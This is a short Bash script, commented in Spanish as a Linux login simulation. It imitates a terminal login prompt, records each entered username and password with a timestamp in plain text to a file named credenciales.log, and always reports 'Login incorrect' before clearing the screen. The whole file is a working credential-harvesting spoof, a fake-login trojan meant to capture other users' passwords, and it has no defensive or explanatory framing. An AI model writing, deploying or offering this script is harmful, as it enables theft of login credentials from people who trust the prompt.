#!/bin/bash

#
# Script para simular un login de Linux.
#

LOGS="credenciales.log"
INTENTOS=3

clear

if command -v lsb_release &> /dev/null; then
    OS_NAME=$(lsb_release -d | cut -f2)
else
    OS_NAME=$(uname -s)
fi

TTY=$(tty | sed 's/\/dev\///')

for ((i=1; i<=INTENTOS; i++)); do
    echo -e "$OS_NAME $TTY\n"
    read -r -p "$OS_NAME login: " usuario
    read -r -s -p "Password: " contrasena
    echo

    echo "$(date '+%Y-%m-%d %H:%M:%S') - Usuario: $usuario, Password: $contrasena" >> "$LOGS"

    sleep 2
    
    if [ $i -lt $INTENTOS ]; then
        echo "Login incorrect"
        sleep 1
    fi
done

echo "Login incorrect"
sleep 1
clear

exit 0
